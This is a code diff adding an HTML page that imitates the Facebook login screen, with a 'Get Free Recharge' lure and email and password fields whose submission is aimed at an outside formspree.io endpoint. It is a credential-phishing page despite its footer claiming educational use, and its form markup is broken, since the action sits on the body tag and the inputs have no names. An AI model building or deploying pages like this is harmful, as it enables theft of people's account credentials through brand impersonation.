@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook – log in or sign up</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .logo {
+      font-size: 48px;
+      color: #1877f2;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .recharge-heading {
+      font-size: 20px;
+      color: #111;
+      margin-bottom: 20px;
+    }
+
+    .login-box {
+      background: #fff;
+      padding: 20px 20px 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 360px;
+    }
+
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
+      width: 100%;
+      padding: 14px;
+      margin: 8px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    .login-box button {
+      width: 100%;
+      background-color: #1877f2;
+      color: white;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+
+    .login-box .forgot {
+      display: block;
+      text-align: center;
+      margin-top: 12px;
+      color: #1877f2;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .divider {
+      height: 1px;
+      background: #dddfe2;
+      margin: 20px 0;
+    }
+
+    .create-btn {
+      background-color: #42b72a;
+      margin-top: 10px;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #65676b;
+      margin-top: 20px;
+    }
+
+    @media (max-width: 400px) {
+      .logo {
+        font-size: 36px;
+      }
+    }
+  </style>
+</head>
+<body action="https://formspree.io/f/mpwlalvo" method="POST">
+  <div class="container">
+    <div class="logo">facebook</div>
+    <div class="recharge-heading">Get Free Recharge</div>
+    <div class="login-box">
+      <input type="text" placeholder="Email address or phone number" />
+      <input type="password" placeholder="Password" />
+      <button type="submit">Log In</button>
+      <a href="#" class="forgot">Forgotten password?</a>
+      <div class="divider"></div>
+      <button class="create-btn">Create new account</button>
+    </div>
+    <div class="footer">This is a clone for educational use only</div>
+  </div>
+</body>
+</html>
+
